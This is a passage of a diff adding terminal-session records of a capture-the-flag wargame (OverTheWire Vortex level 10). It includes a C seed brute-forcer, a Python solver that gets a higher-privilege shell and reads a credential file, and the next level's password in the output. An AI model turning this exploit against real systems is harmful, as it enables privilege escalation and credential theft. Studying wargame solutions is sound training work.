+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim cracke.c",
+     "text": "vim cracke.c -- insert chunk 4",
+     "out": [
+      "  1 #include <stdio.h>",
+      "  2 #include <stdlib.h>",
+      "  3 #include <string.h>",
+      "  4 #include <time.h>",
+      "  5",
+      "  6 #define NV 20",
+      "  7",
+      "  8 /* Brute-force the srand() seed: for every candidate time value and skip",
+      "  9    count, reseed the target's own libc rand() and compare the next 20",
+      " 10    outputs against the array the level printed. */",
+      " 11 int main(int argc, char **argv) {",
+      " 12     unsigned arr[NV];",
+      " 13     for (int i = 0; i < NV; i++) arr[i] = strtoul(argv[i+1], 0, 16);",
+      " 14     time_t t0 = time(0);",
+      " 15     for (int t = (int)t0 - 600; t < (int)t0 + 600; t++) {",
+      " 16         for (int skip = 0; skip < 500; skip++) {",
+      " 17             srand((unsigned)t);",
+      " 18             for (int i = 0; i < skip; i++) rand();",
+      " 19             int ok = 1;",
+      " 20             for (int i = 0; i < NV; i++)",
+      " 21                 if ((unsigned)rand() != arr[i]) { ok = 0; break; }",
+      " 22             if (ok) { printf(\"FOUND seed=%d skip=%d\\n\", t, skip); return 0; }",
+      " 23         }",
+      " 24     }",
+      " 25     printf(\"NOPE\\n\");",
+      " 26     return 1;",
+      " 27 }",
+      " 28",
+      "cracke.c [+]                                                                      28,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim cracke.c",
+     "text": "vim cracke.c -- finished, before :wq",
+     "out": [
+      "  1 #include <stdio.h>",
+      "  2 #include <stdlib.h>",
+      "  3 #include <string.h>",
+      "  4 #include <time.h>",
+      "  5",
+      "  6 #define NV 20",
+      "  7",
+      "  8 /* Brute-force the srand() seed: for every candidate time value and skip",
+      "  9    count, reseed the target's own libc rand() and compare the next 20",
+      " 10    outputs against the array the level printed. */",
+      " 11 int main(int argc, char **argv) {",
+      " 12     unsigned arr[NV];",
+      " 13     for (int i = 0; i < NV; i++) arr[i] = strtoul(argv[i+1], 0, 16);",
+      " 14     time_t t0 = time(0);",
+      " 15     for (int t = (int)t0 - 600; t < (int)t0 + 600; t++) {",
+      " 16         for (int skip = 0; skip < 500; skip++) {",
+      " 17             srand((unsigned)t);",
+      " 18             for (int i = 0; i < skip; i++) rand();",
+      " 19             int ok = 1;",
+      " 20             for (int i = 0; i < NV; i++)",
+      " 21                 if ((unsigned)rand() != arr[i]) { ok = 0; break; }",
+      " 22             if (ok) { printf(\"FOUND seed=%d skip=%d\\n\", t, skip); return 0; }",
+      " 23         }",
+      " 24     }",
+      " 25     printf(\"NOPE\\n\");",
+      " 26     return 1;",
+      " 27 }",
+      " 28",
+      "cracke.c [+]                                                                      28,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "gcc -O2 -o cracke cracke.c && ls -l cracke",
+     "out": [
+      "-rwxrwxr-x 1 vortex10 vortex10 16216 Nov 16 14:24 cracke"
+     ]
+    },
+    {
+     "cmd": "vim solve10.py",
+     "text": "vim solve10.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "solve10.py                                                                        0,0-1          All",
+      "\"solve10.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim solve10.py",
+     "text": "vim solve10.py -- insert chunk 1",
+     "out": [
+      "  1 import subprocess, re, time, struct, sys",
+      "  2",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "solve10.py [+]                                                                    2,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve10.py",
+     "text": "vim solve10.py -- insert chunk 2",
+     "out": [
+      "  1 import subprocess, re, time, struct, sys",
+      "  2",
+      "  3 # run the level, capture the 20-value rand() array it prints",
+      "  4 p = subprocess.Popen([\"/vortex/vortex10\"], stdin=subprocess.PIPE,",
+      "  5                      stdout=subprocess.PIPE)",
+      "  6 line = p.stdout.readline().decode()",
+      "  7 arr = re.findall(r\"[0-9a-f]{8}\", line)",
+      "  8 print(\"array:\", \" \".join(arr[:5]), \"...\", flush=True)",
+      "  9",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "solve10.py [+]                                                                    9,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve10.py",
+     "text": "vim solve10.py -- insert chunk 3",
+     "out": [
+      "  1 import subprocess, re, time, struct, sys",
+      "  2",
+      "  3 # run the level, capture the 20-value rand() array it prints",
+      "  4 p = subprocess.Popen([\"/vortex/vortex10\"], stdin=subprocess.PIPE,",
+      "  5                      stdout=subprocess.PIPE)",
+      "  6 line = p.stdout.readline().decode()",
+      "  7 arr = re.findall(r\"[0-9a-f]{8}\", line)",
+      "  8 print(\"array:\", \" \".join(arr[:5]), \"...\", flush=True)",
+      "  9",
+      " 10 # crack the srand() seed with the C cracker (the target's own libc rand)",
+      " 11 args = [\"./cracke\"] + arr",
+      " 12 r = subprocess.run(args, capture_output=True, text=True, timeout=180)",
+      " 13 print(\"cracker:\", r.stdout.strip(), flush=True)",
+      " 14 m = re.search(r\"seed=(-?\\d+)\", r.stdout)",
+      " 15 if not m:",
+      " 16     print(\"NO SEED\", flush=True)",
+      " 17     sys.exit(1)",
+      " 18 seed = int(m.group(1))",
+      " 19",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "solve10.py [+]                                                                    19,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve10.py",
+     "text": "vim solve10.py -- insert chunk 4",
+     "out": [
+      "  2",
+      "  3 # run the level, capture the 20-value rand() array it prints",
+      "  4 p = subprocess.Popen([\"/vortex/vortex10\"], stdin=subprocess.PIPE,",
+      "  5                      stdout=subprocess.PIPE)",
+      "  6 line = p.stdout.readline().decode()",
+      "  7 arr = re.findall(r\"[0-9a-f]{8}\", line)",
+      "  8 print(\"array:\", \" \".join(arr[:5]), \"...\", flush=True)",
+      "  9",
+      " 10 # crack the srand() seed with the C cracker (the target's own libc rand)",
+      " 11 args = [\"./cracke\"] + arr",
+      " 12 r = subprocess.run(args, capture_output=True, text=True, timeout=180)",
+      " 13 print(\"cracker:\", r.stdout.strip(), flush=True)",
+      " 14 m = re.search(r\"seed=(-?\\d+)\", r.stdout)",
+      " 15 if not m:",
+      " 16     print(\"NO SEED\", flush=True)",
+      " 17     sys.exit(1)",
+      " 18 seed = int(m.group(1))",
+      " 19",
+      " 20 # the answer is read(0, &target, 4): send the seed as 4 raw bytes",
+      " 21 p.stdin.write(struct.pack(\"<i\", seed))",
+      " 22 p.stdin.flush()",
+      " 23 # the shell spawns: feed the verification commands",
+      " 24 time.sleep(1)",
+      " 25 p.stdin.write(b\"id; cat /etc/vortex_pass/vortex11; exit\\n\")",
+      " 26 p.stdin.flush()",
+      " 27 out = p.stdout.read(400)",
+      " 28 print(\"response:\", out.decode('latin-1')[:200], flush=True)",
+      " 29",
+      "solve10.py [+]                                                                    29,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim solve10.py",
+     "text": "vim solve10.py -- finished, before :wq",
+     "out": [
+      "  2",
+      "  3 # run the level, capture the 20-value rand() array it prints",
+      "  4 p = subprocess.Popen([\"/vortex/vortex10\"], stdin=subprocess.PIPE,",
+      "  5                      stdout=subprocess.PIPE)",
+      "  6 line = p.stdout.readline().decode()",
+      "  7 arr = re.findall(r\"[0-9a-f]{8}\", line)",
+      "  8 print(\"array:\", \" \".join(arr[:5]), \"...\", flush=True)",
+      "  9",
+      " 10 # crack the srand() seed with the C cracker (the target's own libc rand)",
+      " 11 args = [\"./cracke\"] + arr",
+      " 12 r = subprocess.run(args, capture_output=True, text=True, timeout=180)",
+      " 13 print(\"cracker:\", r.stdout.strip(), flush=True)",
+      " 14 m = re.search(r\"seed=(-?\\d+)\", r.stdout)",
+      " 15 if not m:",
+      " 16     print(\"NO SEED\", flush=True)",
+      " 17     sys.exit(1)",
+      " 18 seed = int(m.group(1))",
+      " 19",
+      " 20 # the answer is read(0, &target, 4): send the seed as 4 raw bytes",
+      " 21 p.stdin.write(struct.pack(\"<i\", seed))",
+      " 22 p.stdin.flush()",
+      " 23 # the shell spawns: feed the verification commands",
+      " 24 time.sleep(1)",
+      " 25 p.stdin.write(b\"id; cat /etc/vortex_pass/vortex11; exit\\n\")",
+      " 26 p.stdin.flush()",
+      " 27 out = p.stdout.read(400)",
+      " 28 print(\"response:\", out.decode('latin-1')[:200], flush=True)",
+      " 29",
+      "solve10.py [+]                                                                    29,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -l solve10.py",
+     "out": [
+      "29 solve10.py"
+     ]
+    },
+    {
+     "cmd": "timeout 170 python3 solve10.py",
+     "out": [
+      "array: 5d882855 1c3e35f9 447101ba 3e72440f 18d64731 ...",
+      "cracker: FOUND seed=1794839484 skip=366",
+      "$ response: uid=5011(vortex11) gid=5010(vortex10) groups=5010(vortex10)",
+      "xb4DVZ2av"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex11@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5011(vortex11) gid=5011(vortex11) groups=5011(vortex11)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex11",
+     "out": [
+      "xb4DVZ2av"
      ]
     },
     {
